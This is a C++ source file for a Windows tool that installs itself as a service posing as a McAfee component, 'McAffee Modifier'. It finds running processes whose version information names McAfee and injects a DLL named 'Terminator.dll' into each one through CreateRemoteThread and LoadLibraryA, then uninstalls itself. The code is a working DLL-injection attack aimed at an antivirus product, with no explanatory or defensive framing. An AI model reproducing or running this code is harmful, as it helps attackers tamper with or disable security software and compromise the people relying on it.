#ifndef _ENTRY_CPP
#define _ENTRY_CPP
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <Windows.H>
#include <Stdio.H>
#include <Stdlib.H>
#include <tlhelp32.h>
#include <winver.h>
#include <Psapi.h>
#include <ctype.h>

#include "CService.H"
#include "ServiceEntry.H"

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

CService gService;
char *gsServiceName = "McAffee Modifier";
char *gsVendorName = "McAfee";

typedef struct _tag_LANGANDCODEPAGE {
	WORD wLanguage;
	WORD wCodePage;
} LANGANDCODEPAGE, *LPLANGANDCODEPAGE;


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#ifdef _DEBUG
int main(int argc, char *argv[])
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevious, LPSTR CmdLine, int CmdShow)
#endif
{
	gService.Initialize(gsServiceName, &ServiceProcedure, NULL);

#ifdef _DEBUG
	if(argc > 1 && _strcmpi(argv[1], "/RunService") == 0)
#else
	if(_strcmpi(CmdLine, "/RunService") == 0)
#endif
	{
		if(gService.IsActive() == _SVC_NO_)
		{
			if(gService.RunAsService() == _SVC_SUCCESS_)
			{

			}
		}
	}
	else {
		if(gService.IsInstalled() != _SVC_YES_)
		{
			if(gService.Install(gsServiceName) != _SVC_SUCCESS_ )
			{
				return 1;
			}
			gService.Start();
		}
		else {
			gService.Uninstall();
		}
	}

	return 0;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool ServiceProcedure(LPVOID lpVoid)
{
	EnumProcesses();
	Sleep(1000);
	gService.Uninstall();
	return true;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool EnumProcesses(void)
{
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	PROCESSENTRY32 pe32;
	memset(&pe32, 0, sizeof(pe32));
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if(!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return false;
	}

	do
	{
		if(pe32.th32ProcessID > 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if(hProcess)
			{
				char sFileName[MAX_PATH];
				if(GetModuleFileNameEx(hProcess, NULL, sFileName, sizeof(sFileName)))
				{
					if(IsTargetedProduct(sFileName))
					{
						InjectApplication(pe32.th32ProcessID);
					}
				}
				CloseHandle(hProcess);
			}
		}

	} while(Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);

	return true;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool IsTargetedProduct(char *sFileName)
{
	char sVendorName[255];
	bool bIsTargetedProduct = false;
	char sVersionPath[255];
	unsigned int iTranslateSize = 0;
	LANGANDCODEPAGE *lpTranslate;

	strcpy_s(sVendorName, sizeof(sVendorName), gsVendorName);
	tolower(sVendorName);
	
	DWORD dwDummy;
    DWORD dwSize = GetFileVersionInfoSize(sFileName, &dwDummy);
    if (dwSize == 0)
    {
        return false;
    }

	void *data = (void *)calloc(dwSize, 1);
    if (!GetFileVersionInfo(sFileName, NULL, dwSize, data))
    {
        return false;
    }

	VerQueryValue(data, "\\VarFileInfo\\Translation", (LPVOID*)&lpTranslate, &iTranslateSize);

	const char *Sections[] = 
	{
		"ProductName",
		"ProductVersion",
		"FileDescription",
		"InternalName",
		"LegalCopyright",
		"Comments",
		"CompanyName",
		NULL
	};

	for(unsigned int iLnaguage = 0; iLnaguage < (iTranslateSize/sizeof(LANGANDCODEPAGE)) && !bIsTargetedProduct; iLnaguage++)
	{
		for(int iSection = 0; Sections[iSection] && !bIsTargetedProduct; iSection++)
		{
			LPVOID pvVersionString = NULL;
			unsigned int iVersionSize = 0;

			sprintf_s(sVersionPath, sizeof(sVersionPath), "\\StringFileInfo\\%04x%04x\\%s",
				lpTranslate[iLnaguage].wLanguage, lpTranslate[iLnaguage].wCodePage, Sections[iSection]);
			if(VerQueryValue(data, sVersionPath, &pvVersionString, &iVersionSize))
			{
				if(strstr(tolower((char *)pvVersionString), sVendorName))
				{
					bIsTargetedProduct = true;
				}
			}
		}
	}

	free(data);

    return bIsTargetedProduct;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool InjectApplication(int processId)
{
	char sCurrentModule[MAX_PATH];
	char sDrive[MAX_PATH];
	char sDir[MAX_PATH];
	char sDLLName[MAX_PATH];

	HANDLE hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	if(hProcessHandle == NULL)
	{
		return false;
	}

    HANDLE hDLLHandle = GetModuleHandle("Kernel32");
    if(hDLLHandle == NULL)
    {
        return 1;
    }

	HANDLE hLibraryAddress = GetProcAddress((HMODULE)hDLLHandle, "LoadLibraryA");
	if(hLibraryAddress == NULL)
	{
		return false;
	}

	GetModuleFileName(NULL, sCurrentModule, sizeof(sCurrentModule));
	_splitpath_s(sCurrentModule, sDrive, sizeof(sDrive), sDir, sizeof(sDir), NULL, NULL, NULL, NULL);
	_makepath_s(sDLLName, sizeof(sDLLName), sDrive, sDir, "Terminator", ".dll");

	LPVOID pvRemoteMemory = VirtualAllocEx(
		hProcessHandle,
		NULL,
		strlen(sDLLName) + 1,
		MEM_COMMIT|MEM_RESERVE,   
		PAGE_READWRITE
	);

	if(WriteProcessMemory(hProcessHandle, pvRemoteMemory, sDLLName, strlen(sDLLName) + 1, NULL))
	{
		HANDLE hThreadHandle = CreateRemoteThread(
			hProcessHandle,
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)hLibraryAddress,
			pvRemoteMemory,
			NULL,
			0
		);

		if(hThreadHandle)
		{
			WaitForSingleObject(hThreadHandle, INFINITE);
		}

		VirtualFreeEx(hProcessHandle, pvRemoteMemory, strlen(sDLLName) + 1, MEM_RELEASE);
	}

	CloseHandle(hProcessHandle);
	CloseHandle(hDLLHandle);
	CloseHandle(hLibraryAddress);

	return false;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

char *tolower(char *str)
{
	for(int i = 0; str[i]; i++)
	{
		str[i] = tolower(str[i]);
	}
	return str;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#endif
